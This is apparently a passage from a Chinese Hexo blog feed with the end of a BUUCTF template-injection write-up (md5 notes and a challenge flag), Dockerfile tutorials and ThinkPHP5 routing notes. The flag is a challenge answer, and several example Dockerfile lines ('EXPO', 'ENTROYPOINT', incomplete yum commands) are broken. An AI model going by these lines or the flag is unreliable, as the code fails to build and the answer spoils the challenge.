class="line">&#x2F;&#x2F;hashlib.md5（）#获取一个md5加密算法对象</span><br><span class="line">&#x2F;&#x2F;.hexdigest()返回摘要，作为十六进制数据字符串值</span><br><span class="line">&#x2F;&#x2F;python3跟python2区别：python3下字符串为Unicode类型，而hash传递时需要的是utf-8类型，因此，需要类型转换</span><br></pre></td></tr></table></figure><p>然后得到flag<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/rJiBStL.png" alt=""></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;04c40e94-4087-49e3-85c6-74a9472025c0&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> BUUCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dockerfile解析</title>
      <link href="/undefined/dockerfile%E8%A7%A3%E6%9E%90/"/>
      <url>/undefined/dockerfile%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a><font color = yellow >Dockerfile</font></h1><h2 id="dockerfile是什么："><a href="#dockerfile是什么：" class="headerlink" title="dockerfile是什么："></a><font color = red>dockerfile是什么：</font></h2><p>Dockerfile是用来构建Docker镜像的构建文件，是由一系列命令和参数构成的脚本。</p><h3 id="构建三步骤"><a href="#构建三步骤" class="headerlink" title="构建三步骤"></a><font color = gree >构建三步骤</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1丶编写Dockerfile 文件</span><br><span class="line">2丶docker build 创建镜像</span><br><span class="line">3丶docker run 运行容器</span><br></pre></td></tr></table></figure><h3 id="文件什么样？"><a href="#文件什么样？" class="headerlink" title="文件什么样？"></a><font color = gree>文件什么样？</font></h3><h4 id="以我们熟悉的centos为例："><a href="#以我们熟悉的centos为例：" class="headerlink" title="以我们熟悉的centos为例："></a>以我们熟悉的centos为例：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM scratch</span><br><span class="line">MAINTAINER The CentOS Project &lt;cloud-ops@centos.org&gt;</span><br><span class="line">ADD c68-docker.tar.xz &#x2F;</span><br><span class="line">LABEL name&#x3D;&quot;CentOS Base Image&quot; \</span><br><span class="line">    vendor&#x3D;&quot;CentOS&quot; \</span><br><span class="line">    license&#x3D;&quot;GPLv2&quot; \</span><br><span class="line">    build-date&#x3D;&quot;2016-06-02&quot;</span><br><span class="line"></span><br><span class="line"># Default command</span><br><span class="line">CMD [&quot;&#x2F;bin&#x2F;bash&quot;]</span><br></pre></td></tr></table></figure><h1 id="Dockerfile-构建过程解析"><a href="#Dockerfile-构建过程解析" class="headerlink" title=" Dockerfile 构建过程解析"></a><font color = yellow> Dockerfile 构建过程解析</font></h1><h3 id="Docker内容基础知识"><a href="#Docker内容基础知识" class="headerlink" title="Docker内容基础知识"></a><font color = gree>Docker内容基础知识</font></h3><ul><li>1：每条表指令都必须为大写字母且后面要跟随至少一个参数</li><li>2：指令按照从上到下，顺序执行</li><li>3：#表示注释</li><li>4：每条指令都会创建一个新的镜像层，并对镜像进行提交<h3 id="Docker执行Dockerfile的大致流程"><a href="#Docker执行Dockerfile的大致流程" class="headerlink" title="Docker执行Dockerfile的大致流程"></a><font color = gree>Docker执行Dockerfile的大致流程</font></h3></li><li>1：docker从基础镜像运行一个容器</li><li>2：执行一条指令并对容器做出修改</li><li>3：执行类似docker commit的操作提交一个新的镜像层</li><li>4：docker再基于刚提交的镜像运行一个新容器</li><li>5：执行dockerfile中的下一条指令知道所有指令都执行完成<h3 id="小总结："><a href="#小总结：" class="headerlink" title="小总结："></a>小总结：</h3><h4 id="从应用软件的角度来看，Dockerfile丶Docker镜像与Docker容器分别代表软件的三个不同截断"><a href="#从应用软件的角度来看，Dockerfile丶Docker镜像与Docker容器分别代表软件的三个不同截断" class="headerlink" title="从应用软件的角度来看，Dockerfile丶Docker镜像与Docker容器分别代表软件的三个不同截断"></a><font color = red>从应用软件的角度来看，Dockerfile丶Docker镜像与Docker容器分别代表软件的三个不同截断</font></h4></li><li>Dockerfile是原件的原材料</li><li>Docker镜像是原件的交付品</li><li>Docker容器则可以认为是软件的运行态<br>Dockerfile面向开发，Docker镜像成为交付标准，Docker容器则涉及部署与运维，三者缺一不可</li></ul><hr><ul><li><p>1丶Dockerfile，需要定义一个Dockerfile，Dockerfile定 义了进程需要的一-切东西。Dockerfile涉及的内容包括执行代码或者是文件、环境变量、依赖包、运行时环境、动态链接库、操作系统的发行版、服务进程和内核进程（当应用进程需要和系统服务和内核进程打交道，这时需要考虑如何设计namespace的权限控制）等等；</p></li><li><p>2丶Docker镜像，在用Dockerfile定义-一个 文件之后，docker build时会产生–个Docker镜像，当运行Docker镜像时，会真正开始提供服务；</p></li><li><p>3丶Docker容器，容器是直接提供服务的。</p></li></ul><hr><h1 id="DockerFile体系结构"><a href="#DockerFile体系结构" class="headerlink" title="DockerFile体系结构"></a><font color = yellow>DockerFile体系结构</font></h1><ul><li><p><font color = gree>FROM</font><br>基础镜像，当前新镜像是基于哪个镜像的</p></li><li><p><font color = gree>MAINTAINER</font><br>镜像维护者的姓名和邮箱地址</p></li><li><p><font color = gree>RUN</font><br>容器构建时需要运行的命令</p></li><li><p><font color = gree>EXPOSE</font><br>当前容器对外暴露出的端口</p></li><li><p><font color = gree>WORKDIR</font><br>指定在创建容器后，终端默认登录的进来的工作目录，一个落脚点<br>举例：默认打开centos的目录为根目录”/“  ，就是WORKDIR指定的落脚点</p></li><li><p><font color = gree>ENV</font><br>用来在构建镜像过程中设置环境变量</p></li><li><p><font color = gree>ADD</font><br>将宿主机目录下的文件拷贝进镜像且ADD命令会自动处理URL和解压tar压缩包</p></li><li><p><font color = gree>COPY</font><br>类似ADD，拷贝文件和目录到镜像中。<br>将从构建上下文目录中&lt;源路径&gt;的文件/目录复制到新的–层的镜像内的&lt;目标路径&gt;位置<br>COPY src dest<br>COPY [“src”,”dest”]</p></li><li><p><font color = gree>VOLUME</font><br>容器数据卷，用于数据保存和持久化工作</p></li><li><p><font color = gree>CMD</font><br>指定一个容器启动时要运行的命令:<br>Dockerfile 中可以有多个CMD指令，但只有最后一个生效，CMD会被docker run之后的参数替换</p></li><li><p><font color = gree>ENTRYPOINT</font><br>指定一个容器启动时要运行的命令<br>ENTRYPOINT的目的和CMD一样，都是在指定容器启动程序及参数</p></li><li><p><font color = gree>ONBUILD</font><br>当构建一个被继承的Dockerfile时运行命令，父镜像在被子继承后父镜像的onbuild被触发</p></li></ul><h1 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a><font color = yellow>案例一</font></h1><ul><li><p><font color = gree>Base镜像(scratch)</font><br>DockerHub中99%的镜像都是通过在base<br>镜像中安装和配置需要的软件构建出来的</p></li><li><p><font color = gree>自定义镜像mycentos</font><br>1丶编写<br>Hub默认CentOS镜像什么情况   </p></li></ul><p>1.初始centos运行该镜像时默认路径是根<br>2.默认不支持vim<br>3.默认不支持ifconfig<br>准备编写DockerFile文件<br>myCentOS内容DockerFile<br>2丶构建<br>docker build -t 新镜像名字：TAG .<br>3丶运行<br>docker run -it<br>4丶列出镜像的变更历史<br>docker history 镜像ID</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM centos                &#x2F;&#x2F;设置基础镜像为centos</span><br><span class="line">MAINTAINER yym&lt;yimingy72@gmail.com&gt;  &#x2F;&#x2F;设置作者和作者邮箱</span><br><span class="line">ENV mypath &#x2F;tmp            &#x2F;&#x2F;设置环境变量mypath为 &#x2F;tmp</span><br><span class="line">WORKDIR $mypath           &#x2F;&#x2F;设置落脚点为 &#x2F;tmp</span><br><span class="line">RUN  yum  -y  install       &#x2F;&#x2F;安装Vim </span><br><span class="line">RUN  yum  -y  net-tools    &#x2F;&#x2F;安装net-tool   </span><br><span class="line">EXPO 80                    &#x2F;&#x2F;设置运行端口</span><br><span class="line">CMD &#x2F;bin&#x2F;bash              &#x2F;&#x2F;设置运行命令</span><br></pre></td></tr></table></figure><h1 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a><font color = yellow>案例二</font></h1><h3 id="CMD-ENTRYPOINT镜像案例："><a href="#CMD-ENTRYPOINT镜像案例：" class="headerlink" title="CMD/ENTRYPOINT镜像案例："></a>CMD/ENTRYPOINT镜像案例：</h3><ul><li><p>都是指定一个容器启动时要运行的命令   </p></li><li><p>CMD<br>Dockerfile中可以有多个CMD指令，但只有最后一个生效，CMD会被docker run之后的参数替换<br>Case<br>tomcat的讲解演示    </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it -p 8888:8080 tomcat ls -l</span><br></pre></td></tr></table></figure></li><li><p>ENTRYPOINT<br>docker run之后的参数会被当做参数传递给ENTRYPOINT，之后形成新的命令组合<br>Case<br>制作CMD版可以查询IP信息的容器<br>问题<br>WHY<br>制作ENTROYPOINT版查询IP信息的容器</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM centos</span><br><span class="line">RUN yum install -y curl               &#x2F;&#x2F;安装curl命令</span><br><span class="line">CMD [&quot;curl&quot;,&quot;-s&quot;,&quot;http:&#x2F;&#x2F;ip.cn&quot;]         &#x2F;&#x2F;查IP</span><br></pre></td></tr></table></figure><p>制作ENTROYPOINT版查询IP信息的容器,可以追加命令docker run myip -i返回文件头</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM centos</span><br><span class="line">RUN yum install -y curl               &#x2F;&#x2F;安装curl命令</span><br><span class="line">ENTROYPOINT [&quot;curl&quot;,&quot;-s&quot;,&quot;http:&#x2F;&#x2F;ip.cn&quot;]         &#x2F;&#x2F;查IP</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dockerfile创建数据卷</title>
      <link href="/undefined/dockerfile%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%8D%B7/"/>
      <url>/undefined/dockerfile%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%8D%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="DockerFile-创建数据卷"><a href="#DockerFile-创建数据卷" class="headerlink" title="DockerFile 创建数据卷"></a><font color=red>DockerFile 创建数据卷</font></h1><p>在 Dockerfile 中使用 Volume 指令来给镜像添加一个或多个数据卷。<br>语法格式：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VOLUME[&quot;&#x2F;dataVolumeContainer1&quot;,&quot;&#x2F;dataVolumeContainer2&quot;]</span><br></pre></td></tr></table></figure><p>说明：<br>出于可移值和分享的考虑，用 -v 主机目录:容器目录 这种方法 不能够直接在Dockerfile中实现。  </p><p>由于宿主机目录是依赖于特定宿主机的，并不能保证在所有宿主机上都存在这样的特定目录。</p><h2 id="根目录下新建-mydocker-目录并进入"><a href="#根目录下新建-mydocker-目录并进入" class="headerlink" title="根目录下新建 mydocker 目录并进入"></a><font color = gree >根目录下新建 mydocker 目录并进入</font></h2><h3 id="终端container："><a href="#终端container：" class="headerlink" title="终端container：  "></a><font color = gree>终端container：  </font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]# mkdir &#x2F;mydocker</span><br><span class="line">[root@localhost &#x2F;]# cd mydocker&#x2F;</span><br><span class="line">[root@localhost mydocker]# pwd</span><br><span class="line">&#x2F;mydocker</span><br><span class="line">[root@localhost mydocker]#</span><br><span class="line">[root@localhost mydocker]# vi Dockerfile</span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「xiaojin21cen」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;xiaojin21cen&#x2F;java&#x2F;article&#x2F;details&#x2F;84501206</span><br></pre></td></tr></table></figure><h2 id="Dockerfile-："><a href="#Dockerfile-：" class="headerlink" title="Dockerfile ："></a><font color = gree>Dockerfile ：</font></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volume test</span><br><span class="line">FROM centos</span><br><span class="line">VOLUME [&quot;&#x2F;dataVolumeContainer1&quot;,&quot;&#x2F;dataVolumeContainer2&quot;]</span><br><span class="line">CMD echo &quot;finished,------success1&quot;</span><br><span class="line">CMD &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>说明：<br>上面的 Dockerfile 的内容 等价于</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it -v &#x2F;host1:&#x2F;dataVolumeContainer1 -v &#x2F;host2:&#x2F;dataVolumeContainer2 centos &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><h2 id="docker-build-：构建镜像"><a href="#docker-build-：构建镜像" class="headerlink" title="docker build ：构建镜像"></a><font color = gree>docker build ：构建镜像</font></h2><p>格式：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -f(file容器卷) &#x2F;mydocker&#x2F;Dockerfile -t zzyy&#x2F;centos(镜像名) .</span><br></pre></td></tr></table></figure><p>注意，最后一位是个点（.）   </p><p>操作内容：   </p><p>终端container：   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost mydocker]# vi Dockerfile</span><br><span class="line">[root@localhost mydocker]# ls</span><br><span class="line">Dockerfile</span><br><span class="line">[root@localhost mydocker]# cat Dockerfile </span><br><span class="line"># volume test</span><br><span class="line">FROM centos</span><br><span class="line">VOLUME [&quot;&#x2F;dataVolumeContainer1&quot;,&quot;&#x2F;dataVolumeContainer2&quot;]</span><br><span class="line">CMD echo &quot;finished,------success1&quot;</span><br><span class="line">CMD &#x2F;bin&#x2F;bash</span><br><span class="line">[root@localhost mydocker]# docker build -f &#x2F;mydocker&#x2F;Dockerfile -t zzyy&#x2F;centos .</span><br><span class="line">Sending build context to Docker daemon  2.048kB</span><br><span class="line">Step 1&#x2F;4 : FROM centos</span><br><span class="line"> ---&gt; 75835a67d134</span><br><span class="line">Step 2&#x2F;4 : VOLUME [&quot;&#x2F;dataVolumeContainer1&quot;,&quot;&#x2F;dataVolumeContainer2&quot;]</span><br><span class="line"> ---&gt; Running in 041cc7e7d58f</span><br><span class="line">Removing intermediate container 041cc7e7d58f</span><br><span class="line"> ---&gt; b49f99cf2001</span><br><span class="line">Step 3&#x2F;4 : CMD echo &quot;finished,------success1&quot;</span><br><span class="line"> ---&gt; Running in 2e8ed8aedbff</span><br><span class="line">Removing intermediate container 2e8ed8aedbff</span><br><span class="line"> ---&gt; 8ec90a7d9d43</span><br><span class="line">Step 4&#x2F;4 : CMD &#x2F;bin&#x2F;bash</span><br><span class="line"> ---&gt; Running in fb87df9d2666</span><br><span class="line">Removing intermediate container fb87df9d2666</span><br><span class="line"> ---&gt; 1846c594f7f9</span><br><span class="line">Successfully built 1846c594f7f9</span><br><span class="line">Successfully tagged zzyy&#x2F;centos:latest</span><br><span class="line">[root@localhost mydocker]#</span><br></pre></td></tr></table></figure><h3 id="查看镜像："><a href="#查看镜像：" class="headerlink" title="查看镜像：  "></a><font color = gree>查看镜像：  </font></h3><p>终端container：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost mydocker]# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">zzyy&#x2F;centos         latest              1846c594f7f9        42 seconds ago      200MB</span><br><span class="line">atguigu&#x2F;mytomcat    1.2                 b105c1f52eb5        8 hours ago         463MB</span><br><span class="line">redis               latest              c188f257942c        9 days ago          94.9MB</span><br><span class="line">tomcat              latest              ca9e2fccef98        3 weeks ago         463MB</span><br><span class="line">centos              latest              75835a67d134        6 weeks ago         200MB</span><br><span class="line">[root@localhost mydocker]#</span><br></pre></td></tr></table></figure><h2 id="测试新构建的容器"><a href="#测试新构建的容器" class="headerlink" title="测试新构建的容器"></a><font color = gree>测试新构建的容器</font></h2><p>终端container：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost mydocker]# docker run -it  zzyy&#x2F;centos</span><br><span class="line">[root@299d9be66cf2 &#x2F;]# pwd</span><br><span class="line">&#x2F;</span><br><span class="line">[root@299d9be66cf2 &#x2F;]# </span><br><span class="line">[root@299d9be66cf2 &#x2F;]# ll</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r--.   1 root root 12030 Oct  6 19:15 anaconda-post.log</span><br><span class="line">lrwxrwxrwx.   1 root root     7 Oct  6 19:14 bin -&gt; usr&#x2F;bin</span><br><span class="line">drwxr-xr-x.   2 root root     6 Nov 25 10:31 dataVolumeContainer1</span><br><span class="line">drwxr-xr-x.   2 root root     6 Nov 25 10:31 dataVolumeContainer2</span><br><span class="line">drwxr-xr-x.   5 root root   360 Nov 25 10:31 dev</span><br><span class="line">drwxr-xr-x.   1 root root    66 Nov 25 10:31 etc</span><br><span class="line">drwxr-xr-x.   2 root root     6 Apr 11  2018 home</span><br><span class="line">lrwxrwxrwx.   1 root root     7 Oct  6 19:14 lib -&gt; usr&#x2F;lib</span><br><span class="line">lrwxrwxrwx.   1 root root     9 Oct  6 19:14 lib64 -&gt; usr&#x2F;lib64</span><br><span class="line">drwxr-xr-x.   2 root root     6 Apr 11  2018 media</span><br><span class="line">drwxr-xr-x.   2 root root     6 Apr 11  2018 mnt</span><br><span class="line">drwxr-xr-x.   2 root root     6 Apr 11  2018 opt</span><br><span class="line">dr-xr-xr-x. 280 root root     0 Nov 25 10:31 proc</span><br><span class="line">dr-xr-x---.   2 root root   114 Oct  6 19:15 root</span><br><span class="line">drwxr-xr-x.  10 root root   130 Oct  6 19:15 run</span><br><span class="line">lrwxrwxrwx.   1 root root     8 Oct  6 19:14 sbin -&gt; usr&#x2F;sbin</span><br><span class="line">drwxr-xr-x.   2 root root     6 Apr 11  2018 srv</span><br><span class="line">dr-xr-xr-x.  13 root root     0 Nov 25 06:17 sys</span><br><span class="line">drwxrwxrwt.   7 root root   132 Oct  6 19:15 tmp</span><br><span class="line">drwxr-xr-x.  13 root root   155 Oct  6 19:14 usr</span><br><span class="line">drwxr-xr-x.  18 root root   238 Oct  6 19:14 var</span><br><span class="line">[root@299d9be66cf2 &#x2F;]#</span><br></pre></td></tr></table></figure><p>创建并运行容器后，发现自动创建了两个数据卷</p><h2 id="docker-inspect-查看容器数据卷"><a href="#docker-inspect-查看容器数据卷" class="headerlink" title="docker inspect 查看容器数据卷"></a><font color = gree >docker inspect 查看容器数据卷</font></h2><p>查找对应的主机目录地址。</p><p>方法：docker inspect 容器id</p><p>终端test：<br>查找宿主机的目录地址</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES</span><br><span class="line">299d9be66cf2        zzyy&#x2F;centos         &quot;&#x2F;bin&#x2F;sh -c &#x2F;bin&#x2F;bash&quot;   3 minutes ago       Up 3 minutes                            gifted_fermat</span><br><span class="line">[root@localhost &#x2F;]# docker inspect 299d9be66cf2</span><br><span class="line">....省略....</span><br><span class="line">        &quot;Mounts&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;Type&quot;: &quot;volume&quot;,</span><br><span class="line">                &quot;Name&quot;: &quot;ebecb97f356f449783bd9898ebd2c6b31559fb58fff5981350dc7fd4fe1d0941&quot;,</span><br><span class="line">                &quot;Source&quot;: &quot;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;ebecb97f356f449783bd9898ebd2c6b31559fb58fff5981350dc7fd4fe1d0941&#x2F;_data&quot;,</span><br><span class="line">                &quot;Destination&quot;: &quot;&#x2F;dataVolumeContainer1&quot;,</span><br><span class="line">                &quot;Driver&quot;: &quot;local&quot;,</span><br><span class="line">                &quot;Mode&quot;: &quot;&quot;,</span><br><span class="line">                &quot;RW&quot;: true,</span><br><span class="line">                &quot;Propagation&quot;: &quot;&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;Type&quot;: &quot;volume&quot;,</span><br><span class="line">                &quot;Name&quot;: &quot;d668bc0dfbc64f722fae55f4986c3417eb88850ab62e2e50aef9b50f31bad37c&quot;,</span><br><span class="line">                &quot;Source&quot;: &quot;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;d668bc0dfbc64f722fae55f4986c3417eb88850ab62e2e50aef9b50f31bad37c&#x2F;_data&quot;,</span><br><span class="line">                &quot;Destination&quot;: &quot;&#x2F;dataVolumeContainer2&quot;,</span><br><span class="line">                &quot;Driver&quot;: &quot;local&quot;,</span><br><span class="line">                &quot;Mode&quot;: &quot;&quot;,</span><br><span class="line">                &quot;RW&quot;: true,</span><br><span class="line">                &quot;Propagation&quot;: &quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">....省略....</span><br><span class="line">[root@localhost &#x2F;]#</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在节点Mounts节点中已经给出了宿主机的目录地址</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;ebecb97f356f449783bd9898ebd2c6b31559fb58fff5981350dc7fd4fe1d0941&#x2F;_data 对应的是 &#x2F;dataVolumeContainer1</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;d668bc0dfbc64f722fae55f4986c3417eb88850ab62e2e50aef9b50f31bad37c&#x2F;_data 对应的是 &#x2F;dataVolumeContainer2</span><br></pre></td></tr></table></figure><h2 id="主机对应默认地址"><a href="#主机对应默认地址" class="headerlink" title="主机对应默认地址"></a><font color = gree>主机对应默认地址</font></h2><p>终端container：<br>进入 dataVolumeContainer1 中，编辑 container.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@299d9be66cf2 &#x2F;]# ls</span><br><span class="line">anaconda-post.log  dataVolumeContainer1  dev  home  lib64  mnt  proc  run   srv  tmp  var</span><br><span class="line">bin                dataVolumeContainer2  etc  lib   media  opt  root  sbin  sys  usr</span><br><span class="line">[root@299d9be66cf2 &#x2F;]# cd dataVolumeContainer1&#x2F;</span><br><span class="line">[root@299d9be66cf2 dataVolumeContainer1]# ls</span><br><span class="line">[root@299d9be66cf2 dataVolumeContainer1]# echo &quot;container add&quot;&gt; container.txt</span><br><span class="line">[root@299d9be66cf2 dataVolumeContainer1]# cat container.txt </span><br><span class="line">container add</span><br><span class="line">[root@299d9be66cf2 dataVolumeContainer1]#</span><br></pre></td></tr></table></figure><p>终端host：<br>进入/var/lib/docker/volumes/ebecb97f356f449783bd9898ebd2c6b31559fb58fff5981350dc7fd4fe1d0941/_data 目录中：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]# cd &#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;ebecb97f356f449783bd9898ebd2c6b31559fb58fff5981350dc7fd4fe1d0941&#x2F;_data</span><br><span class="line">[root@localhost _data]# ls</span><br><span class="line">container.txt</span><br><span class="line">[root@localhost _data]# cat container.txt </span><br><span class="line">container add</span><br><span class="line">[root@localhost _data]#</span><br></pre></td></tr></table></figure><h1 id="数据卷的继承（继承之后各个容器共享数据卷）"><a href="#数据卷的继承（继承之后各个容器共享数据卷）" class="headerlink" title="数据卷的继承（继承之后各个容器共享数据卷）"></a><font color=red>数据卷的继承（继承之后各个容器共享数据卷）</font></h1><p>使用同一个镜像创建容器<br>假设之前已经使用dockerfile创建的镜像创建了一个容器dc-01<br>1丶创建容器继承dc-01数据卷</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it --name dc-02 --volumes-from dc-01 dockerfile&#x2F;centos</span><br></pre></td></tr></table></figure><p>此时在对应的容器卷文件夹下已经可以共享文件了；dc-02创建的文件dc-1也能读写</p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>18.thinkphp5资源路由和快捷路由</title>
      <link href="/undefined/18.thinkphp5%E8%B5%84%E6%BA%90%E8%B7%AF%E7%94%B1%E5%92%8C%E5%BF%AB%E6%8D%B7%E8%B7%AF%E7%94%B1/"/>
      <url>/undefined/18.thinkphp5%E8%B5%84%E6%BA%90%E8%B7%AF%E7%94%B1%E5%92%8C%E5%BF%AB%E6%8D%B7%E8%B7%AF%E7%94%B1/</url>
      
        <content type="html"><![CDATA[<h1 id="一丶资源路由和快捷路由"><a href="#一丶资源路由和快捷路由" class="headerlink" title="一丶资源路由和快捷路由"></a><font color=red>一丶资源路由和快捷路由</font></h1><h1 id="1丶资源路由"><a href="#1丶资源路由" class="headerlink" title="1丶资源路由"></a><font color=green>1丶资源路由</font></h1><p>5.0支持设置 RESTFu1请求的资源路由，方式如下:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Route:resource（&#39;blog&#39;,&#39;index&#x2F;blog&#39;）</span><br></pre></td></tr></table></figure><p>或者在路由配置文件中使用<strong>rest</strong>添加资源路由定义：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return[</span><br><span class="line">    &#x2F;&#x2F;定义资源路由</span><br><span class="line">    &#39;__rest__&#39;&#x3D;&gt;[</span><br><span class="line">        &#x2F;&#x2F;指向index模块的blog控制器</span><br><span class="line">        &#39;blog&#39;&#x3D;&gt;&#39;index&#x2F;blog&#39;,</span><br><span class="line">    ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>设置过后会自动注册7个路由规则，如下：<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/B6I8AzU.png" alt="1"><br>具体指向的控制器由路由地址决定，例如上面的设置，会对应 index模块的blog控制器，你只需要为Blog控制器创建以上对应的操作方法就可以支持下面的URL访问：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;serverName&#x2F;blog&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;serverName&#x2F;blog&#x2F;128</span><br><span class="line">http:&#x2F;&#x2F;serverName&#x2F;blog&#x2F;28&#x2F;edit</span><br></pre></td></tr></table></figure><p>Blog控制器中对应的方法如下：<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/zXL2LmW.png" alt="1"></p><h1 id="2丶快捷路由"><a href="#2丶快捷路由" class="headerlink" title="2丶快捷路由"></a><font color=green>2丶快捷路由</font></h1><p>快捷路由允许你快速给控制器注册路由，并且针对不同的请求类型可以设置方法前缀，例如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;给User控制器设置快捷路由</span><br><span class="line">Route::controller(&#39;user&#39;,&#39;index&#x2F;User&#39;);</span><br></pre></td></tr></table></figure><p>User控制器定义如下：<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/6a8Efg1.png" alt="1"><br>我们可以通过下面的URL访问</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get http:&#x2F;&#x2F;localhost&#x2F;user&#x2F;info</span><br><span class="line">get http:&#x2F;&#x2F;localhost&#x2F;user&#x2F;phone</span><br><span class="line">post http:&#x2F;&#x2F;localhost&#x2F;user&#x2F;info</span><br><span class="line">put http:&#x2F;&#x2F;localhost&#x2F;user&#x2F;info</span><br><span class="line">delete http:&#x2F;&#x2F;loaclhost&#x2F;user&#x2F;info</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> thinkphp5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>17.thinkphp5路由之路由注册</title>
      <link href="/undefined/17.thinkphp5%E8%B7%AF%E7%94%B1%E4%B9%8B%E8%B7%AF%E7%94%B1%E6%B3%A8%E5%86%8C/"/>
      <url>/undefined/17.thinkphp5%E8%B7%AF%E7%94%B1%E4%B9%8B%E8%B7%AF%E7%94%B1%E6%B3%A8%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="一丶路由之路由注册"><a href="#一丶路由之路由注册" class="headerlink" title="一丶路由之路由注册"></a><font color=red>一丶路由之路由注册</font></h1><h1 id="路由"><a href="#路由" class="headerlink" title="路由"></a><font color=green size=6>路由</font></h1><p>路由功能由<code>\think\Route</code>类完成。</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a><font color=green>概述</font></h2><p>由于<code>ThinkPHP5.0默认采用的URL规则是：</code></p><p><code>http://server/module/controller/action/param/value/.....</code></p><p>路由的作用是简化URL访问地址，并根据定义的路由类型做出正确的解析。</p><h2 id="路由模式"><a href="#路由模式" class="headerlink" title="路由模式"></a><font color=green>路由模式</font></h2><p><code>ThinkPHP5.0</code>的路由比较灵活，并且不需要强制定义，可以总结归纳为如下三种方式：</p><h3 id="一、普通模式"><a href="#一、普通模式" class="headerlink" title="一、普通模式"></a><font color=green>一、普通模式</font></h3><p>关闭路由，完全使用默认的<code>PATH_INFO</code>方式URL：</p><p><code>url_route_on     =&gt;   false,</code></p><p>路由关闭后，不会解析任何路由规则，采用默认的<code>PATH_INFO</code>模式访问URL:</p><p><code>http://serverName/index.php/module/controller/action/param/value/...</code></p><h3 id="二、混合模式"><a href="#二、混合模式" class="headerlink" title="二、混合模式"></a><font color=green>二、混合模式</font></h3><p>开启路由，并使用路由定义+默认<code>PATH_INFO</code>方式的混合:</p><p><code>&#39;url_route_on&#39;  =&gt;  true,</code></p><p><code>&#39;url_route_must&#39;   =&gt; 